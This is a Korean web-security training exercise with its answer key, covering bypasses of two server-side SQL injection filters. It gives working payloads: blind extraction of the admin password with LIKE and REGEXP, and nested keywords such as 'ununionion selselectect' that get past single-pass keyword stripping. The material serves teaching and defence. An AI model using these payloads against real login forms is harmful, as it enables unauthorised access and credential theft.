Application Code를 확인하여 서버에서 SQL Injection을 방어하는 방법의 문제점을 찾아 우회해보시기 바랍니다.

아래 탭에 있는 정답을 통해 확인해보실 수 있습니다.

목표0: SQL Injection을 통해 Admin의 Full Password를 찾아 Find Admin Password에 입력하세요.
    
    hint: pw???? (?는 0~9 사이 숫자)
    Application Code

    if(uid.match(/sub|str|mid|pad/gi)) { WAF_Detect(); }
    if(upw.match(/sub|str|mid|pad/gi)) { WAF_Detect(); }
    ...
    if(res['uid']){ return True; }

    User ID:
    User PW:
    Find Admin PW:
    Input Admin Password :

    Query:
        select * from users where uid="" and upw="";

    Result :

    답 :
        User ID: admin" and upw regexp 'pw1337.*' --

    Query:
        select uid from users where uid="admin" and upw regexp 'pw1337.*' --" and upw=""

    Blind SQL Injection을 용이하게 사용할 수 있는 함수명을 차단하는 코드입니다.
    하지만 모든 경우에 대해 방어하지 못하여 다른 대체 함수 또는 문법을 통해 우회가능합니다.
    아래에 설명한 방법외에도 DBMS마다 다양한 방법들이 존재합니다. 
    [ like 구문 사용 ]
    _ 또는 %와 같은 와일드 카드를 사용하여 문자열을 찾을 수 있습니다.
    
    uid=admin" and upw like "p%"-- 
    uid=admin" and upw like "pw"-- 
    ...
    uid=admin" and upw like "pw1337"-- 
    
    [ 정규표현식 사용 ] 
    정규표현식 regexp 구문을 사용하여 문자열을 찾을 수 있습니다.
    
    uid=admin" and upw regexp 'p.*' -- 
    uid=admin" and upw regexp 'pw.*' -- 
    ...
    uid=admin" and upw regexp 'pw1337' -- 

목표1: SQL Injection을 통해 Admin의 Full Password를 찾아 Find Admin Password에 입력하세요.
    Application Code

    uid = uid.replace(/union|select|from/gi, '');
    upw = upw.replace(/union|select|from/gi, '');
    ...
    return res['uid'];

    User ID:
    User PW:
    Find Admin PW:
    Input Admin Password :

    Query:
        select * from users where uid="" and upw="";

    Result :

    답 :
        User ID: " ununionion selselectect upw frfromom users --

        Query:
            select uid from users where uid="" union select upw from users --" and upw=""

        Result :
        Adm1nP@ssW0rd

    특정 문자열이 탐지되면 해당 문자열을 변경하는 과정을 거칩니다.
    아래 공격 코드와 같이 1회만 치환되도록 하여 우회할 수 있습니다.
    uid=" ununionion selselectect upw frfromom users -- 
